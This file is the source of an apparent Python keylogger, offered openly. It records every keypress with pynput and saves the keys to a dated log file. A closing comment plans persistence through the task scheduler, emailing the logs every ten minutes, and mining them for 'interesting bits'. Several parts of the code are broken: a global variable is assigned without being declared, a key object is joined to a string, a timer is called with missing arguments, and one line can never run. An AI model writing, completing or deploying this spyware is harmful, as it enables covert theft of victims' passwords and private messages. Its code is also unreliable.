from pynput.keyboard import Key, Listener
from datetime import date
import psutil
import os
import threading

PATH = os.path.dirname(os.path.abspath(__file__))
log = ''

def on_press(key):
    log += key + ' '

def isRunning(processName):
    for pid in psutil.pids():
        p = psutil.Process(pid)
        if p.name() == processName:
            return True
    return False

def saveLog(log):
    with open('{}\\{}_keyslogged.txt'.format(PATH, date.today()), 'a') as f:
        f.write(log +'\n')

def writeSchedule(log, interval):
    threading.Timer(float(interval), writeSchedule).start()
    saveLog(log)
    return ''

with Listener(on_press=on_press) as listener:
    listener.join()
log = writeSchedule(log, 20)

"""
create buffer and save after every t seconds
create a task in task scheduler.
send to email aevery 10 min
sister script that downloads emails
anyalize logs to find interesting bits
"""

